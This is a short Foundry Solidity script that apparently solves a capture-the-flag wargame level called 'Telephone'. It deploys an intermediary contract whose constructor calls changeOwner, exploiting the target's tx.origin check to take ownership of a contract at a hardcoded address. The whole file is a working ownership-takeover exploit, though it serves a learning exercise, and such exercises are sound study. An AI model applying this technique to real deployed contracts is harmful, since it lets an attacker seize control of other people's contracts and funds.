// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level4.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract IntermediatoryContract{

    constructor(Telephone _telephoneInstance, address _newOwner){
        _telephoneInstance.changeOwner(_newOwner);
    }
}

contract Level4Sol is Script{

    Telephone public level4 = Telephone(0x7Ca95d4b9f0a67539f9A3586e895C67547c76190);

    function run() external{
    
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
    new IntermediatoryContract(
        level4,vm.envAddress("MY_ADDRESS")
    );

    vm.stopBroadcast();
    }
}
